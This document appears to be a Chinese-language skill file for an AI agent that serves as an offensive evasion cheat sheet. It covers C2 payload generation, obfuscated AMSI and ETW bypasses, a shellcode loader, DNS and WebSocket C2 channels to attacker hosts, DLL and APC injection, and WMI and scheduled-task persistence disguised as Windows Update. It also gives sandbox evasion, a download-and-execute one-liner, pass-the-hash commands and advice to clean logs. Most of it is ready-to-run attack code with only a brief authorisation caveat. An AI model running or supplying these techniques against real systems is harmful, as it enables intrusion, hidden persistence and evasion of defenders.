---
name: evasion-techniques
description: 免杀对抗 — AV绕过、C2框架、权限维持、横向移动、隐蔽通信
version: 1.0.0
author: Hermes Agent
license: MIT
metadata:
  hermes:
    tags: [evasion, av-bypass, c2, persistence, stealth, red-team]
---

# 免杀对抗技术

## 核心工具

| 工具 | 用途 |
|------|------|
| **Metasploit** | 渗透框架 |
| **Sliver** | 开源C2框架 |
| **Havoc** | 开源C2框架 |
| **Covenant** | .NET C2框架 |
| **Empire** | PowerShell C2 |
| **Mythic** | 跨平台C2框架 |
| **Cobalt Strike** | 商业C2(参考) |
| **Veil** | Payload生成 |
| **Shellter** | PE注入 |
| **Donut** | .NET/PE/Shellcode转换 |
| **ScareCrow** | Payload混淆 |
| **AMSI Bypass** | 绕过Windows Defender |
| **Obfuscator** | 代码混淆 |
| **Chisel** | 隧道 |
| **ligolo-ng** | 反向代理 |
| **dnscat2** | DNS隧道 |
| **iodine** | DNS隧道 |

---

## 1. C2框架

### Sliver
```bash
# 安装
curl https://sliver.sh/install|sudo bash

# 服务端
sliver-server

# 生成Payload
generate --mtls ATTACKER_IP --os windows --arch amd64 --save shell.exe
generate --http https://domain.com --os linux --save shell.elf

# 监听
mtls --lport 443
http --domain domain.com

# 客户端连接后
sessions                # 列出会话
use <session_id>        # 选择会话
info                    # 会话信息
shell                   # 获取shell
execute -o "whoami"     # 执行命令

# 高级功能
execute-assembly /path/to/tool.exe   # 内存执行.NET
inject --pid <PID> --arch amd64      # 进程注入
```

### Havoc
```bash
# 安装
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc && make

# 启动
./havoc server --profile ./havoc.yaotl

# 生成Payload
# Web界面 → Attack → Payload → 选择类型
```

### Mythic
```bash
# Docker安装
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic && sudo ./install_docker_ubuntu.sh
sudo make

# 启动
sudo ./mythic-cli start

# Web界面
# https://localhost:7443
```

---

## 2. AV绕过技术

### 代码混淆
```python
# 变量名混淆
import random, string
def random_name(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

# 字符串加密
def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

# Base64 + XOR多层加密
import base64
def multi_encode(shellcode, key=b"mykey"):
    encrypted = xor_encrypt(shellcode, key)
    return base64.b64encode(encrypted)
```

### Donut — Shellcode生成
```bash
# 安装
git clone https://github.com/TheWover/donut.git
cd donut && make

# .NET → Shellcode
./donut -f payload.exe

# PowerShell → Shellcode
./donut -f script.ps1

# Python加载shellcode
import ctypes
shellcode = open("payload.bin", "rb").read()
ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(addr, shellcode, len(shellcode))
ctypes.windll.kernel32.CreateThread(0, 0, addr, 0, 0, 0)
```

### ScareCrow — Payload混淆
```bash
git clone https://github.com/optiv/ScareCrow.git
cd ScareCrow && go build -o ScareCrow

# 生成免杀Payload
./ScareCrow -Loader binary -payload shell.exe
./ScareCrow -Loader dll -payload shell.dll
./ScareCrow -Loader shellcode -payload shell.bin

# 支持的加载器
# binary    - EXE
# dll       - DLL注入
# shellcode - 原始shellcode
# control   - Control Panel (.cpl)
# wscript   - WScript
```

### AMSI Bypass
```powershell
# 方法1: 补丁AMSI.dll
$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"};$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"};[IntPtr]$c=$b.GetValue($null);[Int32[]]$d=@(0);[System.Runtime.InteropServices.Marshal]::Copy($d,0,$c,1)

# 方法2: 设置AMSI为未初始化
S`eT-It`em ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'U','il','t','nageme','A.','ils','S' ) )."g`et`fie`Ld"( ( "{0}{2}{1}" -f'rit','aged','M' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPub','c','lic' ))."SET`vaLUE"(${n`ULl},${t`RuE} )

# 方法3: 反射DLL注入
[System.Reflection.Assembly]::Load([byte[]](Get-Content -Path "amsi.dll" -Encoding Byte))
```

### ETW Bypass
```csharp
// Patch ETW (Event Tracing for Windows)
// 找到EtwEventWrite地址，修改第一个字节为0xC3(RET)
var etw = typeof(System.Diagnostics.Eventing.EventProvider).Assembly.GetType("System.Runtime.InteropServices.Marshal")
    .GetMethod("GetDelegateForFunctionPointer");
```

---

## 3. 隐蔽通信

### DNS隧道
```bash
# dnscat2
# 服务端
ruby dnscat2.rb --dns domain=attacker.com --secret=mysecret

# 客户端
dnscat2-client attacker.com

# iodine
# 服务端
iodined -f 10.0.0.1 attacker.com

# 客户端
iodine attacker.com
```

### HTTPS通信
```
# C2通过HTTPS通信
# 优点: 加密、看起来正常
# 使用合法域名做前置:
# - Cloudflare Workers
# - Azure Functions
# - AWS Lambda
# - GitHub Pages
```

### 域前置 (Domain Fronting)
```bash
# 利用CDN的SNI和Host不一致
# TLS SNI: cdn.legitimate.com
# HTTP Host: attacker.com
# CDN将请求转发到attacker.com

# 配置C2使用域前置
# 在Cloudflare/AWS CloudFront设置
```

### WebSocket隧道
```python
# WebSocket作为C2通信通道
import websockets, asyncio

async def c2_client():
    async with websockets.connect("wss://attacker.com/ws") as ws:
        while True:
            cmd = await ws.recv()
            result = subprocess.run(cmd, shell=True, capture_output=True)
            await ws.send(result.stdout)
```

---

## 4. 进程注入

### DLL注入
```c
// 简化DLL注入
#include <windows.h>

void InjectDLL(DWORD pid, const char* dll_path) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID addr = VirtualAllocEx(hProc, NULL, strlen(dll_path)+1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProc, addr, dll_path, strlen(dll_path)+1, NULL);
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, 
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"),
        addr, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProc, addr, 0, MEM_RELEASE);
}
```

### Process Hollowing
```python
# 创建挂起的目标进程
# 替换其内存中的代码
# 恢复执行

# 使用donut生成shellcode
# 注入到合法进程(svchost, explorer等)
```

### APC注入
```c
// 异步过程调用注入
QueueUserAPC((PAPCFUNC)shellcode_addr, hThread, 0);
// 或
NtQueueApcThread(hThread, shellcode_addr, 0, 0, 0);
```

---

## 5. 权限维持

### COM劫持
```bash
# 注册恶意COM对象
# HKCU\Software\Classes\CLSID\{GUID}\InprocServer32
# 指向恶意DLL

# 常见被劫持的COM对象
# {0A8E561E-5C11-4D9C-9B2E-...} (各种自动启动的COM)
```

### WMI持久化
```powershell
# 创建永久事件订阅
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "MyFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "MyConsumer"
    CommandLineTemplate = "C:\temp\backdoor.exe"
}

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

### 计划任务
```powershell
# 隐藏的计划任务
schtasks /create /tn "Microsoft\Windows\WindowsUpdate" /tr "C:\temp\backdoor.exe" /sc onlogon /ru SYSTEM /f

# 使用XML创建(更隐蔽)
Register-ScheduledTask -Xml (Get-Content task.xml | Out-String) -TaskName "WindowsUpdate"
```

---

## 6. 沙箱/检测绕过

### 检测沙箱
```python
import os, time, ctypes

def is_sandbox():
    # 1. 检查进程数量
    if len(os.popen('tasklist').readlines()) < 30:
        return True
    
    # 2. 检查内存大小
    import psutil
    if psutil.virtual_memory().total < 2 * 1024**3:  # < 2GB
        return True
    
    # 3. 检查CPU核心数
    if os.cpu_count() < 2:
        return True
    
    # 4. 检查磁盘大小
    if os.path.getsize('/') < 60 * 1024**3:  # < 60GB
        return True
    
    # 5. 检查最近鼠标移动
    # (需要Windows API)
    
    # 6. 检查已安装软件
    common_apps = ['VMware', 'VirtualBox', 'Sandboxie', 'Cuckoo']
    # ...
    
    return False

# 延迟执行(等沙箱超时)
time.sleep(300)  # 5分钟
```

### 绕过AMSI/ETW
```powershell
# 运行前先patch
# 然后加载工具
IEX (New-Object Net.WebClient).DownloadString('http://attacker/tool.ps1')
```

---

## 7. 横向移动技术

### Pass-the-Hash
```bash
# Impacket
psexec.py -hashes :NTHASH domain/user@target
wmiexec.py -hashes :NTHASH domain/user@target
smbexec.py -hashes :NTHASH domain/user@target
```

### Over-Pass-the-Hash
```bash
# 获取TGT
getTGT.py domain/user -hashes :NTHASH

# 使用TGT获取服务票证
export KRB5CCNAME=user.ccache
getST.py -spn cifs/target domain/user -k -no-pass
```

### PSRemoting
```powershell
# 启用PSRemoting
Enable-PSRemoting -Force

# 远程执行
Invoke-Command -ComputerName target -ScriptBlock { whoami }

# 交互式会话
Enter-PSSession -ComputerName target
```

---

## Pitfalls

1. **永远在授权范围内测试** — 未授权渗透是违法的
2. **AV签名会更新** — 今天的免杀明天可能失效
3. **行为检测比签名难绕** — 内存操作、网络行为、API调用模式
4. **C2通信要加密** — 明文通信会被IDS检测
5. **域名前置可能被封** — CDN提供商在修复这个问题
6. **进程注入容易被EDR检测** — 需要更高级的unhook技术
7. **沙箱检测不完美** — 高级沙箱可以模拟所有环境
8. **日志留痕** — 所有操作都会留下日志，注意清理
9. **工具要更新** — 开源工具很快被检测
10. **测试环境先跑** — 生产环境前先在实验室验证
